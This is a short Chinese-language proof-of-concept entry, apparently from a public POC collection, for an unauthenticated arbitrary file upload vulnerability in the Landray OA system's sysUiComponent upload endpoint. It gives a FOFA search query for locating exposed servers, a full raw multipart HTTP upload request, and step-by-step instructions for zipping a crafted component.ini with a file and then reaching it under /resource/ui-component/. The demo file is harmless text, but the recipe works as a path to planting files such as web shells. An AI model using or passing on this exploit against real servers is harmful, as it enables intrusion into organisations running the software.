## 蓝凌OAsysUiComponent 文件存在任意文件上传漏洞

## fofa
```
app="Landray-OA系统"

```


## poc
直接访问路径，发现未授权文件上传 http://.com/sys/ui/sys_ui_component/sysUiComponent.do?method=upload
![c9857f5370d4abd1547fa7cb1988a18a](https://github.com/wy876/POC/assets/139549762/ee361dae-cfa2-4eae-910f-501331731347)

```
POST /sys/ui/sys_ui_component/sysUiComponent.do?method=getThemeInfo&s_ajax=true HTTP/1.1
Host: IP:PORT
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Referer: http://.com/sys/ui/sys_ui_component/sysUiComponent.do?method=upload
Content-Length: 474
Content-Type: multipart/form-data; boundary=---------------------------15610248407689
Cookie: SESSION=YmI0OGMyZDQtZDE0NC00MTQ2LWJmMzMtNWE5NDMwOTYxM2Ex
DNT: 1
Connection: close

-----------------------------15610248407689
Content-Disposition: form-data; name="file"; filename="test.zip"
Content-Type: application/x-zip-compressed

PKx3;x4;x14;
-----------------------------15610248407689
```
## 漏洞复现
创建component.ini文件，内容为：
```
id=2023
name=check.txt
```
创建上传check.txt文件
```
1111
```
然后使用压缩软件，将两个文件压缩成一个压缩包，文件名check.zip


最后上传即可。上传成功后访问路径/resource/ui-component/2023/check.txt


## 漏洞来源
```
https://mp.weixin.qq.com/s/xhwmFuItG8ZoiuGrwR5bnw
```


